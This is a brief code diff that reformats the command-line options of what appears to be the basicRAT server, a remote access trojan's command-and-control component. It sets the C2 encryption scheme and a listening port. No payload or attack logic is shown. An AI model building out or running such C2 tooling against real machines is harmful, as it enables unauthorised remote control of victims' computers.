@@ -41,11 +41,9 @@ quit            - Gracefully kill client and server.
 
 def get_parser():
     parser = argparse.ArgumentParser(description='basicRAT server')
-    parser.add_argument('-c', '--crypto',
-                        help='C2 crypto to use.',
+    parser.add_argument('-c', '--crypto', help='C2 crypto to use.',
                         default='AES', type=str)
-    parser.add_argument('-p', '--port',
-                        help='Port to listen on.',
+    parser.add_argument('-p', '--port', help='Port to listen on.',
                         default=1337, type=int)
     return parser
 
